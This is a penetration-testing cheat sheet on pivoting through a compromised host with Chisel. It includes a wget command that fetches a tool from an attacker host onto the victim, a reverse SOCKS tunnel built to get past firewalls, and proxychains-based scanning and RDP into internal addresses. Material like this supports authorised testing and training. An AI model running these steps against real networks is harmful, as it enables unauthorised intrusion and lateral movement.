# Pivoting with Chisel
**Concept:** You have compromised **Machine A** (The Pivot). You want to reach **Machine B** (Internal Network) which you cannot see directly. Chisel creates a SOCKS5 proxy tunnel through Machine A.
## 1. Setup & Installation
**Context:** Chisel is written in Go, so it compiles to a single static binary. You usually need to build it on Kali and transfer it to the victim.
```shell
# 1. Clone
git clone https://github.com/jpillora/chisel.git
cd chisel

# 2. Build (Compiles a binary named 'chisel')
go build -ldflags "-s -w"

# 3. Transfer to Pivot Host (Victim)
scp chisel user@<PIVOT_IP>:/tmp/
# OR via Python HTTP
python3 -m http.server 80
wget http://<ATTACKER_IP>/chisel -O /tmp/chisel && chmod +x /tmp/chisel
```
## 2. Reverse Pivot (The Gold Standard)
**Scenario:** The Victim has a Firewall blocking **Inbound** connections. 
**Strategy:** We run the Server on **Kali** (Attacker) and force the Victim to connect **Outbound** back to us. This bypasses most firewalls.
### Step A: Attacker (Kali) - The Server
Run this on your attack box to listen for the connection.
- `--reverse`: Allows the client to define the tunnel direction.
- `--socks5`: Enables SOCKS mode.
```shell
# Listen on Port 8000
sudo ./chisel server --reverse -v -p 8000 --socks5
```
### Step B: Victim (Pivot) - The Client
Run this on the compromised machine to connect back to Kali.
- `R:socks`: Tells the server "Create a Reverse SOCKS proxy".
- This defaults to binding port **1080** on the Attacker's machine.
```shell
# Connect back to Kali (10.10.14.17)
./chisel client -v 10.10.14.17:8000 R:socks
```
**Result:** You now have a SOCKS5 proxy listening on `127.0.0.1:1080` on your Kali machine. Traffic sent there goes _through_ the tunnel.
## 3. Forward Pivot (Alternative)
**Scenario:** The Victim allows Inbound connections (rare in enterprise, common in CTF). **Strategy:** Run the Server on the **Victim**.
### Step A: Victim (Pivot) - The Server
```shell
# Listen on Port 8000
./chisel server -v -p 8000 --socks5
```
### Step B: Attacker (Kali) - The Client
```shell
# Connect to the Victim
./chisel client -v <VICTIM_IP>:8000 socks
```
## 4. Configuring Proxychains
**Context:** Now that the tunnel is up (on port 1080), you need to tell your tools to use it.
**File:** `/etc/proxychains4.conf` (or `/etc/proxychains.conf`) 
**Action:** Comment out the default line (usually `socks4 9050`) and add your Chisel socks port.
```shell
[ProxyList]
# socks4 127.0.0.1 9050  <-- Comment this out
socks5 127.0.0.1 1080    <-- Add this
```
## 5. Using the Pivot
**Tools:** Most tools work with `proxychains`, but some require specific flags.

**Nmap (Scanning Internal Host):**
- _Note:_ Proxychains cannot tunnel ICMP (Ping). You must use TCP Connect scans (`-sT`) and skip ping (`-Pn`).
```shell
proxychains nmap -sT -Pn -p 445,80,3389 172.16.5.19
```

**RDP (xfreerdp):**
```shell
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:Password123
```

**Firefox (FoxyProxy):** Configure FoxyProxy to use SOCKS5 IP `127.0.0.1` Port `1080` to browse internal websites.